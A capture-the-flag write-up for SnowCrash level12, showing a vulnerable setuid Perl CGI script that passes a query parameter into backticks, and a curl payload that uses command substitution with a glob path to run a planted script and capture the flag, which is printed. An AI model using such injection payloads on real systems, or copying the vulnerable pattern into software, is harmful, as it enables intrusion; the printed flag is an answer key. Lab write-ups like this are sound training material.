
## level12
Here are the enumeration results
```
level12@SnowCrash:~$ file level12.pl
level12.pl: setuid setgid a perl script, ASCII text executable
```

We are presented with a perl file, here is the code.
```lua=
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

Much like the last level, it seems like the code is already running in a server of port 4646 on localhost.
There are 2 query parameters, namely "x" and "y", which are passed to the function t. The function uses regex to convert alphabets to uppercase and keeps only the first word.
"x", now formatted, is used to egrep the file "/tmp/xd" and redirects stderr to stdout.
The rest of the code checks if the output matches the param "y" and prints 1 or 2 dots.

Our first instinct is to utilize command substitution, but putting the whole command wouldn't work, as the "x" parameter is trimmed to the first word.
To bypass that, we can run the entire command in a script that has a fully uppercase name, like "FLAGGETTER", and substitute that instead.

`/dev/shm/FLAGGETTER`
```bash=
#!/bin/bash

getflag > /dev/shm/flag
```

In order to run the script as a command, we have to add the directory that contains the script to the PATH env variable.

```
export PATH=/dev/shm:$PATH
```

Now we can try to pass the command substitution to the server via curl.

``curl "127.0.0.1:4646?x=\`flaggetter\`&y=y"``

Hmm seems like the flag file wasn't created, what is the error here?

We were stuck here for quite a while, thinking there were problems elsewhere.
We continued to test and in the end, we realized that the updated PATH doesn't carry over to other users.
To resolve the issue, we can use absolute path to run the script.

``curl "127.0.0.1:4646?x=\`/*/*/flaggetter\`&y=y"``

There we go, the flag file is now created at `/dev/shm/flag` and it contains the flag `g1qKMiRpXf53AWhDaU7FEkczr`
